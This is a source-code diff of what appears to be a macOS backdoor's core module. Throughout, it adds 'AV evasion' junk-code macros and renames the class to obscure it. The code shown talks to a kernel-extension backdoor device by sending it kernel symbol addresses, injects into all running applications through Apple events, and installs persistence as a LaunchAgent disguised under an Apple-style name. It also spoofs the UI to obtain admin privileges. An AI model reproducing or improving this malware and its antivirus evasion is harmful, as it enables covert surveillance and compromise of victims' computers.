+//                            XPC_BUNDLE_FOLDER_PREFIX,
+//                            gMyXPCName];
+//  
+//  NSString *origXPCMacho = [[NSString alloc] initWithFormat: @"%@/%@",
+//                            [[NSBundle mainBundle] bundlePath],
+//                            gXPCName];
+// 
+//#ifdef DEBUG_CORE
+//  infoLog(@"xpc service files: orig %@, dest %@", origXPCMacho, destXPCMacho);
+//#endif
+//
+//  [[NSFileManager defaultManager] copyItemAtPath: origXPCMacho
+//                                          toPath: destXPCMacho
+//                                           error: nil];
+//  
+//  [origXPCMacho release];
+//  [destXPCMacho release];
+//}
 
 - (void)_solveKernelSymbolsForKext
-{
+{    
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   int kernFD      = 0;
   int ret         = 0;
   int filesize    = 0;
@@ -2500,7 +2923,10 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
   infoLog(@"Resolving symbols for kernel driver");
 #endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   kernFD = open(filename, O_RDONLY);
   
   if (kernFD == -1) 
@@ -2519,6 +2945,9 @@ void lionSendEventToPid(pid_t pidP)
       return;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   if (stat(filename, &sb) == -1)
     {
 #ifdef DEBUG_CORE
@@ -2532,6 +2961,9 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
   infoLog(@"filesize: %d\n", filesize);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if ((imageBase = mmap(0,
                         filesize,
@@ -2551,6 +2983,9 @@ void lionSendEventToPid(pid_t pidP)
   infoLog(@"file mapped @ 0x%lx\n", (unsigned long)imageBase);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   BOOL kernel64 = is64bitKernel();
   if (kernel64)
     {
@@ -2561,78 +2996,117 @@ void lionSendEventToPid(pid_t pidP)
       uint64_t symAddress = 0;
       // 64bit kernel image
       // thus we need to map the 64bit part
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, kmod_hash);
       sym.hash    = kmod_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, nsysent_hash);
       sym.hash    = nsysent_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, tasks_hash);
       sym.hash    = tasks_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, allproc_hash);
       sym.hash    = allproc_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, tasks_count_hash);
       sym.hash    = tasks_count_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, nprocs_hash);
       sym.hash    = nprocs_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, tasks_threads_lock_hash);
       sym.hash    = tasks_threads_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, proc_lock_hash);
       sym.hash    = proc_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, proc_unlock_hash);
       sym.hash    = proc_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, proc_list_lock_hash);
       sym.hash    = proc_list_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, proc_list_unlock_hash);
       sym.hash    = proc_list_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, kext_lookup_with_tag_hash);
       sym.hash    = kext_lookup_with_tag_hash;
       sym.address  = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
       
       // Sending Symbol
       symAddress  = findSymbolInFatBinary64(imageBase, io_recursive_lock_hash);
@@ -2648,77 +3122,116 @@ void lionSendEventToPid(pid_t pidP)
       symbol32_t sym;
       unsigned int symAddress = 0;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, kmod_hash);
       sym.hash    = kmod_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, nsysent_hash);
       sym.hash    = nsysent_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, tasks_hash);
       sym.hash    = tasks_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, allproc_hash);
       sym.hash    = allproc_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, tasks_count_hash);
       sym.hash    = tasks_count_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, nprocs_hash);
       sym.hash    = nprocs_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, tasks_threads_lock_hash);
       sym.hash    = tasks_threads_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, proc_lock_hash);
       sym.hash    = proc_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, proc_unlock_hash);
       sym.hash    = proc_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, proc_list_lock_hash);
       sym.hash    = proc_list_lock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, proc_list_unlock_hash);
       sym.hash    = proc_list_unlock_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, kext_lookup_with_tag_hash);
       sym.hash    = kext_lookup_with_tag_hash;
       sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
       
       // Sending Symbol
       symAddress  = findSymbolInFatBinary(imageBase, io_recursive_lock_hash);
@@ -2727,7 +3240,14 @@ void lionSendEventToPid(pid_t pidP)
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);      
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   munmap(imageBase, filesize);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   close(kernFD);
 }
 
@@ -2737,7 +3257,10 @@ void lionSendEventToPid(pid_t pidP)
 // Looks like it's undocumented
 //
 - (void)_registerForShutdownNotifications
-{
+{    
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
 #ifdef DEBUG_CORE
@@ -2759,21 +3282,33 @@ void lionSendEventToPid(pid_t pidP)
     {
 #ifdef DEBUG_CORE
       infoLog(@"Registering notifications for Leopard");
-#endif
+#endif    
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       notify_return = notify_register_mach_port(kLLWShutdowntInitiated,
                                                 &our_port,
                                                 0, /* flags */
                                                 &gLWShutdownNotificationToken);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       notify_return = notify_register_mach_port(kLLWRestartInitiated,
                                                 &our_port,
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWRestartNotificationToken);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       notify_return = notify_register_mach_port(kLLWLogoutCancelled,
                                                 &our_port,
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWLogoutCancelNotificationToken);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       notify_return = notify_register_mach_port(kLLWLogoutPointOfNoReturn, 
                                                 &our_port,
@@ -2790,6 +3325,9 @@ void lionSendEventToPid(pid_t pidP)
                                                 0, /* flags */
                                                 &gLWShutdownNotificationToken);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       notify_return = notify_register_mach_port(kSLLWRestartInitiated,
                                                 &our_port,
                                                 NOTIFY_REUSE, /* flags */
@@ -2800,11 +3338,17 @@ void lionSendEventToPid(pid_t pidP)
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWLogoutCancelNotificationToken);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       notify_return = notify_register_mach_port(kSLLWLogoutPointOfNoReturn, 
                                                 &our_port,
                                                 NOTIFY_REUSE, /* flags */
                                                 &gLWLogoutPointOfNoReturnNotificationToken);
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   gNotifyMachPort = CFMachPortCreateWithPort(kCFAllocatorDefault,
                                              our_port,
@@ -2814,12 +3358,18 @@ void lionSendEventToPid(pid_t pidP)
   if (!gNotifyMachPort)
     return;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   // Create RLS for mach port
   gNotifyMachPortRLS = CFMachPortCreateRunLoopSource(kCFAllocatorDefault,
                                                      gNotifyMachPort,
                                                      0); /* order */
   if (!gNotifyMachPortRLS)
     return;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   CFRunLoopAddSource(CFRunLoopGetCurrent(),
                      gNotifyMachPortRLS,
@@ -2836,13 +3386,12 @@ void lionSendEventToPid(pid_t pidP)
 #pragma mark Public Implementation
 #pragma mark -
 
-@implementation RCSMCore
+@implementation __m_MCore
 
 @synthesize mBinaryName;
 @synthesize mApplicationName;
 @synthesize mSpoofedName;
 @synthesize mMainLoopControlFlag;
-
 
 - (id)init
 {
@@ -2926,47 +3475,404 @@ void lionSendEventToPid(pid_t pidP)
   [super dealloc];
 }
 
+- (int)connectKext
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
+#ifdef DEBUG_CORE
+  infoLog(@"Initializing backdoor with kext");
+#endif
+  
+  gBackdoorFD = open(BDOR_DEVICE, O_RDWR);
+  
+  if (gBackdoorFD != -1) 
+  {
+    int ret;//, bID;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
+    ret = ioctl(gBackdoorFD, MCHOOK_INIT, [NSUserName() UTF8String]);
+    
+    if (ret < 0)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error while initializing the uspace-kspace "\
+               "communication channel");
+#endif
+      
+      return -1;
+    }
+    else
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"Backdoor initialized correctly");
+#endif
+    }
+  }
+  else
+  {
+#ifdef DEBUG_CORE
+    errorLog(@"Error while opening the KEXT dev entry!");
+#endif
+    
+    return -1;
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  return 0;
+}
+
+- (void)sendEventToPid: (NSNumber *)thePid
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  AEEventID eventID = 'open';
+  int eUid = geteuid();
+  int rUid = getuid();
+  int maxRetry = 10;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  if (thePid == nil)
+    return;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
+  // On lion fork to sendEvents without problem
+  if ([gUtil isLion]) 
+  {
+    NSTask *aTask = [[NSTask alloc] init];
+    NSMutableArray *args = [NSMutableArray array];
+    NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
+    
+    //argv
+    [args addObject: @"-p"];
+    [args addObject: pidStr];
+    [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
+    [aTask setArguments:args];
+    
+#ifdef DEBUG_CORE
+    verboseLog(@"Running task with args %@", args);
+#endif
+    
+    [aTask launch];
+    [aTask release];
+    [pidStr release];
+    
+#ifdef DEBUG_CORE
+    verboseLog(@"task launched");
+#endif
+    return;
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
+  
+  [gControlFlagLock lock];
+  NSString *localFlag = [_taskManager getControlFlag];
+  [gControlFlagLock unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  if ([localFlag isEqualToString: @"STOP"])
+  {
+    return;
+  }
+  
+  pid_t pidP = (pid_t) [thePid intValue];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
+  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"send event to application pid %d", pidP);
+#endif
+  
+  [gSuidLock lock];
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"enter critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
+#endif
+  
+  // trimming process u&g
+  if (eUid != rUid)
+    seteuid(rUid);
+  
+  [app setTimeout: 1];
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  [app sendEvent: kASAppleScriptSuite
+              id: kGetAEUT
+      parameters: 0];
+  
+  sleep(1);
+  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
+  NSNumber *pid = [NSNumber numberWithInt: getpid()];
+  
+  [app setTimeout: 1];
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  id injectReply = [app sendEvent: 'OPNe'
+                               id: eventID
+                       parameters: 'pido', pid, 0];
+  
+  // Check if the seteuid do the correct work...
+  while ((geteuid() != eUid) && maxRetry--) 
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
+    // original u&g
+    if (seteuid(eUid) == -1)
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"setting euid error [%d]", 
+              errno);
+#endif
+    }
+    
+    usleep(500);
+  }
+  
+  [gSuidLock unlock];
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
+#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  if (injectReply != nil) 
+  {
+#ifdef DEBUG_CORE	
+    warnLog(@"unexpected injectReply: %@", injectReply);
+#endif
+  }
+  else 
+  {
+#ifdef DEBUG_CORE
+    verboseLog(@"injection done");
+#endif
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
+  [pool release];  
+}
+
+- (void)injectRunningApp
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
+  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  NSWorkspace *ws = [NSWorkspace sharedWorkspace];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  NSArray *apps = [ws runningApplications];
+  
+  if (apps && [apps count]) 
+  {
+    for (int i=0; i<[apps count]; i++) 
+    {
+      NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
+      pid_t tmpPid = [app processIdentifier];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
+      NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
+#ifdef DEBUG_CORE_
+      infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
+              [app localizedName], [app processIdentifier]);
+#endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
+      [self sendEventToPid:thePid]; 
+      
+      [thePid release];
+      
+      usleep(500);
+    }
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  [pool release];
+}
+
+- (void)checkAndRunDemoMode
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  NSString *appName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
+  
+  // FIXED- demo mode
+  if ([appName isEqualToString: @"System Preferences"] == FALSE)
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
+    // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
+    //char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
+    //                  "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
+    char demoSha1[] =   "\x4e\xb8\x75\x0e\xa8\x10\xd1\x94\xb4\x69"
+                        "\xf0\xaf\xa8\xf4\x77\x51\x49\x69\xba\x72";
+    
+    NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
+    NSMutableData *demoMode = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    NSMutableData *currDemoMode = [demoMode sha1Hash];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
+    if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
+    {
+      NSString *filePath = [[NSString alloc] initWithFormat: @"%@/%@",
+                            [[NSBundle mainBundle] bundlePath],
+                            @"infected.bmp"];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
+      changeDesktopBg(filePath, NO);
+      
+      gIsDemoMode = YES;
+      
+      [filePath release];
+    }    
+  }
+}
+
 - (BOOL)makeBackdoorResident
-{
-  return [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
-                             forBinary: gBackdoorName];
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
+  NSString *backdoorDaemonName = [NSString stringWithFormat:@"%@.%@.%@", 
+                                                            DOMAIN_COM, 
+                                                            DOMAIN_APL, 
+                                                            LAUNCHD_NAME];
+  
+  return [gUtil createLaunchAgentPlist:backdoorDaemonName
+                             forBinary:gBackdoorName];
 }
 
 - (BOOL)isBackdoorAlreadyResident
-{
-  NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
-                             [[[[[NSBundle mainBundle] bundlePath]
-                                stringByDeletingLastPathComponent]
-                               stringByDeletingLastPathComponent]
-                              stringByDeletingLastPathComponent],
-                             BACKDOOR_DAEMON_PLIST];
+{ 
+  // for upgrade from old version
+  removeOldLd();
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  NSString *backdoorPlist = createLaunchdPlistPath();
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: backdoorPlist
                                            isDirectory: NULL])
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       return YES;
     }
   else
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+    
       return NO;
     }
 }
 
 - (BOOL)shouldUpgradeComponents
 {
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSString *migrationConfig = [[NSString alloc] initWithFormat: @"%@/%@",
                                                                 [[NSBundle mainBundle] bundlePath],
                                                                 RCS8_MIGRATION_CONFIG];
-                                 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath: migrationConfig] == TRUE)
     {  
         NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
                                        [[NSBundle mainBundle] bundlePath],
                                        gConfigurationName];
-                                                            
+      
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+      
         if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
                                                        error: nil])
           {
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_009
+            
             if ([[NSFileManager defaultManager] moveItemAtPath: migrationConfig
                                                         toPath: configurationPath
                                                          error: nil])
@@ -2985,68 +3891,60 @@ void lionSendEventToPid(pid_t pidP)
   NSString *updateDylib = [[NSString alloc] initWithFormat: @"%@/%@",
                                                             [[NSBundle mainBundle] bundlePath],
                                                             RCS8_UPDATE_DYLIB];
-                                                            
-  if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_DYLIB] == TRUE)
+#ifdef DEBUG_CORE
+  infoLog(@"RCS8_UPDATE_DYLIB %@", updateDylib);
+#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: updateDylib] == TRUE)
   
     {
       NSString *dylib = [[NSString alloc] initWithFormat: @"%@/%@",
                                                           [[NSBundle mainBundle] bundlePath],
                                                           gInputManagerName];
+#ifdef DEBUG_CORE
+      infoLog(@"gInputManagerName %@", gInputManagerName);
+#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_000
       
       [[NSFileManager defaultManager] removeItemAtPath:dylib error:nil];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
       
       [[NSFileManager defaultManager] moveItemAtPath: updateDylib
                                               toPath: dylib
                                                error: nil];
+#ifdef DEBUG_CORE
+      infoLog(@"updateDylib %@", updateDylib);
+#endif
+      
       [dylib release];                                      
 
     }
   
   [updateDylib release];
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_XPC] == TRUE)
-    {
-    
-    }
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+//  
+//  if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_XPC] == TRUE)
+//    {
+//    
+//    }
       
   return TRUE;
-}
-
-- (void)checkAndRunDemoMode
-{
-  NSString *appName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
-  
-  // FIXED- demo mode
-  if ([appName isEqualToString: @"System Preferences"] == FALSE)
-    {
-      // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
-      char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
-                        "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
-      
-      NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
-      
-      NSMutableData *demoMode = [[NSData alloc] initWithBytes: gDemoMarker length: 24];
-      
-      NSMutableData *currDemoMode = [demoMode sha1Hash];
-      
-      if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
-        {
-          NSString *filePath = [[NSString alloc] initWithFormat: @"%@/%@",
-                                                                 [[NSBundle mainBundle] bundlePath],
-                                                                 @"infected.bmp"];
-          
-          changeDesktopBg(filePath, NO);
-          
-          gIsDemoMode = YES;
-          
-          [filePath release];
-      }    
-    }
 }
 
 - (BOOL)runMeh
 {
   NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
   
@@ -3060,15 +3958,18 @@ void lionSendEventToPid(pid_t pidP)
   // First of all, calculate properly the shared memory size
   // for logs
   gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   // Get OS version
   [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
                                                      minor: &gOSMinor
                                                     bugFix: &gOSBugFix];
   // First off check if we support the OS
-  if (gOSMajor != 10
-      || (gOSMajor == 10 && gOSMinor < 5)
-      || (gOSMajor == 10 && gOSMinor > 7))
+  if (gOSMajor != OSMAJOR_VER
+      || (gOSMajor == OSMAJOR_VER && gOSMinor < OSMINOR_MIN_VER)
+      || (gOSMajor == OSMAJOR_VER && gOSMinor > OSMINOR_MAX_VER))
     {
       return NO;
     }
@@ -3077,11 +3978,17 @@ void lionSendEventToPid(pid_t pidP)
   // or there are comps ready for upgrade
   [self shouldUpgradeComponents];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
                            [[NSBundle mainBundle] bundlePath]];
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlag])
-    {
+  {  
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+    
       [self makeBackdoorResident];
       [[NSFileManager defaultManager] removeItemAtPath: offlineFlag
                                                  error: nil];
@@ -3091,18 +3998,27 @@ void lionSendEventToPid(pid_t pidP)
   // this values
   [self _resizeSharedMemoryWindow];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // Check it we're the only one on the current user session (1 per user)
   [self _checkForOthers];
   
   // FIXED-
   if ([workingMode isEqualToString: SLIPLIST])
-    {
+  {  
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+    
       // SLIPLIST set by "require admin privileges" unflagged
       noPrivs = YES;
       NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               @"mdworker.flg"];
-      
+    
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+    
       if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                 isDirectory: NO])
         {
@@ -3111,19 +4027,29 @@ void lionSendEventToPid(pid_t pidP)
     }
   else if ([workingMode isEqualToString: UISPOOF])
     {
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       // set by "require admin privileges"
       if ([gUtil isLion] == YES)
         {
           NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                                                              [[NSBundle mainBundle] bundlePath],
                                                              @"mdworker.flg"];
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                     isDirectory: NO])
             {
               [gUtil dropExecFlag];
             }
-        
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           // Enable setugid on lion
           if ([gUtil enableSetugidAuth] == NO)
             {
@@ -3134,30 +4060,48 @@ void lionSendEventToPid(pid_t pidP)
         }
       else
         {
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           uiSuccess = [self _UISpoof];
         }
     }
   
   // Create LaunchAgent dir if it doesn't exists yet
-  NSString *launchAgentPath = [NSString stringWithFormat: @"%@/%@",
-                               NSHomeDirectory(),
-                               [BACKDOOR_DAEMON_PLIST stringByDeletingLastPathComponent]];
-
